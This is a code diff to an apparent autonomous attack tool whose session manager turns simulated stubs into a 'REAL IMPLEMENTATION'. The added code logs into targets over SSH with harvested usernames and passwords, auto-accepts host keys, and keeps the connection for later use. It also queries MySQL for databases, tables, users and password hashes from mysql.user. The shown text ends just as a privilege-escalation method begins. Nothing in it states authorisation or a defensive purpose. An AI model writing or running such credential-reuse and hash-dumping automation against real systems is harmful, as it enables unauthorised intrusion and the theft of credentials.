@@ -37,7 +37,7 @@ class AutonomousSessionManager:
         return actions
     
     def _upgrade_credential_to_shell(self, session: Session, callback=None) -> Optional[Dict]:
-        """Attempt to use credentials to establish an active shell."""
+        """Attempt to use credentials to establish an active shell - REAL IMPLEMENTATION."""
         if not session.username or not session.password:
             return None
         
@@ -46,21 +46,58 @@ class AutonomousSessionManager:
         
         # Try SSH if port 22 is open
         if session.protocol == 'ssh' or session.target_port == 22:
-            # This would execute SSH connection
-            # For now, just mark as upgraded (real implementation would use paramiko)
-            logging.info(f"Would SSH to {session.target_ip} with {session.username}:{session.password}")
-            
-            # Simulate successful upgrade
-            session.upgrade_to_active()
-            session.session_type = SessionType.SSH
-            
+            try:
+                import paramiko
+                
+                # Create SSH client
+                ssh = paramiko.SSHClient()
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                
+                # Attempt connection
+                ssh.connect(
+                    hostname=session.target_ip,
+                    port=session.target_port or 22,
+                    username=session.username,
+                    password=session.password,
+                    timeout=10,
+                    allow_agent=False,
+                    look_for_keys=False
+                )
+                
+                # Test command execution
+                stdin, stdout, stderr = ssh.exec_command('whoami')
+                output = stdout.read().decode().strip()
+                
+                if output:
+                    # Successful SSH connection
+                    session.upgrade_to_active()
+                    session.session_type = SessionType.SSH
+                    session.metadata['ssh_client'] = ssh  # Store client for later use
+                    
+                    if callback:
+                        callback({'message': f'✅ SSH session established to {session.target_ip} as {output}'})
+                    
+                    return {
+                        'action': 'credential_upgrade',
+                        'session_id': session.session_id,
+                        'method': 'ssh'
+                    }
+                
+            except Exception as e:
+                if callback:
+                    callback({'message': f'❌ SSH connection failed: {str(e)[:100]}'})
+        
+        # Try RDP if port 3389 is open
+        elif session.protocol == 'rdp' or session.target_port == 3389:
             if callback:
-                callback({'message': f'✅ SSH session established to {session.target_ip}'})
+                callback({'message': f'⚠️ RDP session upgrade requires manual verification'})
             
+            # Mark as pending RDP session
+            session.session_type = SessionType.RDP
             return {
                 'action': 'credential_upgrade',
                 'session_id': session.session_id,
-                'method': 'ssh'
+                'method': 'rdp'
             }
         
         return None
@@ -145,13 +182,41 @@ class AutonomousSessionManager:
         return results
     
     def _enumerate_db_session(self, session_id: str, callback=None) -> Dict:
-        """Enumerate a database shell session."""
-        # Database enumeration would go here
-        # For SQLMap: enumerate databases, tables, users
-        return {
+        """Enumerate a database shell session - REAL IMPLEMENTATION."""
+        results = {
             'type': 'database_shell',
-            'enumeration': 'pending'
+            'databases': [],
+            'tables': [],
+            'users': [],
+            'passwords': []
         }
+        
+        # Get session details
+        session = self.session_store.get_session(session_id)
+        if not session:
+            return results
+        
+        # SQLMap enumeration commands - execute them through the DB shell
+        enum_commands = [
+            ('SHOW DATABASES;', 'databases'),
+            ('SHOW TABLES;', 'tables'),
+            ('SELECT user FROM mysql.user;', 'users'),
+            ('SELECT user,authentication_string FROM mysql.user;', 'passwords')
+        ]
+        
+        for cmd, result_type in enum_commands:
+            if callback:
+                callback({'message': f'  📊 Enumerating {result_type}...'})
+            
+            # Execute the SQL command in the DB shell
+            output = self._run_command(session_id, cmd, callback)
+            
+            if output:
+                # Parse output and extract results
+                lines = output.strip().split('\n')
+                results[result_type] = [line.strip() for line in lines if line.strip()]
+        
+        return results
     
     def auto_escalate_privileges(self, session_id: str, callback=None) -> bool:
         """
